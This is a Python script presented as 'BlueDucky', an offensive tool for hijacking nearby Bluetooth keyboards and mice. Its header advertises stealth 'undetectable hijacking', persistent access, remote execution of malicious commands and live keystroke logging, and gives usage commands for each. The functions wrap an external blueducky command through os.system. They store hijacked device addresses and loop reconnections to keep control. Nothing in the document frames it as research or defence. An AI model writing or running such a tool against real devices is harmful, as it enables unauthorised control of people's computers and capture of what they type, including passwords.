import argparse
import os
import time
import json

# -------------------------------------------
# BlueDucky - Bluetooth HID Keystroke Injector & MITM Tool
# -------------------------------------------
# Features:
# - Hijacks Bluetooth HID devices (keyboards/mice) using Bluetooth Ducky-style attacks
# - Sends keystroke injection payloads wirelessly
# - Supports long-range attacks with SENA Parani UD100
# - Can perform remote execution of malicious commands on paired/unpaired devices
# - Implements stealth mode for undetectable hijacking
# - Supports automated reconnection to ensure persistent access
# - Integrates with Bluetooth MITM attacks for live keystroke injection
# - Enables live keystroke logging for real-time monitoring
#
# Requirements:
# - Nordic nRF52840 Dongle / Adafruit Bluefruit LE Sniffer
# - Python 3.x
# - Blueducky.py or HID Attack Framework
# - RFCOMM & PyBluez
#
# Usage:
# 1. Scan for Bluetooth HID devices:
#    python blueducky_hijacker.py --scan
# 2. Hijack a Bluetooth keyboard/mouse:
#    python blueducky_hijacker.py --hijack --target XX:XX:XX:XX:XX:XX
# 3. Inject keystrokes remotely:
#    python blueducky_hijacker.py --inject "Hello World"
# 4. Enable persistent hijacking mode:
#    python blueducky_hijacker.py --persist --target XX:XX:XX:XX:XX:XX
# 5. Enable stealth mode:
#    python blueducky_hijacker.py --stealth --target XX:XX:XX:XX:XX:XX
# 6. Run automated reconnection loop:
#    python blueducky_hijacker.py --auto-reconnect --target XX:XX:XX:XX:XX:XX
# 7. Start live keystroke logging:
#    python blueducky_hijacker.py --log-keystrokes --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_bluetooth():
    """Scans for active Bluetooth HID devices."""
    print("[+] Scanning for Bluetooth HID devices...")
    os.system("hcitool scan > bluetooth_scan_results.txt")
    print("[✔] Scan complete. Results saved to bluetooth_scan_results.txt")

def hijack_bluetooth(target):
    """Hijacks a Bluetooth HID device and prepares for keystroke injection."""
    print(f"[+] Hijacking Bluetooth HID device {target}...")
    os.system(f"blueducky --hijack {target}")
    store_hijacked_device(target)
    print("[✔] Hijack successful. Device stored for persistent control.")

def store_hijacked_device(target):
    """Stores hijacked device information for later use."""
    hijacked_devices = load_hijacked_devices()
    if target not in hijacked_devices:
        hijacked_devices.append(target)
    with open("hijacked_bt_devices.json", "w") as f:
        json.dump(hijacked_devices, f)

def load_hijacked_devices():
    """Loads previously stored hijacked devices."""
    try:
        with open("hijacked_bt_devices.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def inject_keystrokes(payload):
    """Injects keystrokes remotely into a hijacked Bluetooth keyboard."""
    print(f"[+] Injecting keystrokes: {payload}")
    os.system(f"blueducky --inject '{payload}'")
    print("[✔] Keystrokes injected successfully.")

def persist_control(target):
    """Maintains persistent hijacking of a Bluetooth HID device."""
    print(f"[+] Enabling persistence for {target}...")
    while True:
        os.system(f"blueducky --reconnect {target}")
        time.sleep(5)

def enable_stealth_mode(target):
    """Enables stealth mode to avoid detection while hijacking Bluetooth HID devices."""
    print(f"[+] Enabling stealth mode for {target}...")
    os.system(f"blueducky --stealth {target}")
    print("[✔] Stealth mode enabled.")

def auto_reconnect(target):
    """Automates the reconnection process to maintain continuous hijacking."""
    print(f"[+] Running auto-reconnect for {target}...")
    while True:
        os.system(f"blueducky --reconnect {target}")
        time.sleep(3)

def log_keystrokes(target):
    """Logs keystrokes from a hijacked Bluetooth keyboard in real time."""
    print(f"[+] Starting live keystroke logging for {target}...")
    os.system(f"blueducky --log-keystrokes {target} > keystroke_log.txt")
    print("[✔] Keystroke logging saved to keystroke_log.txt")

def main():
    parser = argparse.ArgumentParser(description="BlueDucky - Bluetooth HID Keystroke Injector & MITM Tool")
    parser.add_argument("--scan", action='store_true', help="Scan for active Bluetooth HID devices")
    parser.add_argument("--hijack", action='store_true', help="Hijack a Bluetooth HID device")
    parser.add_argument("--inject", type=str, help="Inject keystrokes remotely")
    parser.add_argument("--persist", action='store_true', help="Maintain persistent hijacking of a device")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode to avoid detection")
    parser.add_argument("--auto-reconnect", action='store_true', help="Continuously reconnect to a hijacked device")
    parser.add_argument("--log-keystrokes", action='store_true', help="Enable live keystroke logging from a hijacked device")
    parser.add_argument("--target", type=str, help="Target Bluetooth device MAC address")
    args = parser.parse_args()

    if args.scan:
        scan_bluetooth()
    elif args.hijack and args.target:
        hijack_bluetooth(args.target)
    elif args.inject:
        inject_keystrokes(args.inject)
    elif args.persist and args.target:
        persist_control(args.target)
    elif args.stealth and args.target:
        enable_stealth_mode(args.target)
    elif args.auto_reconnect and args.target:
        auto_reconnect(args.target)
    elif args.log_keystrokes and args.target:
        log_keystrokes(args.target)
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
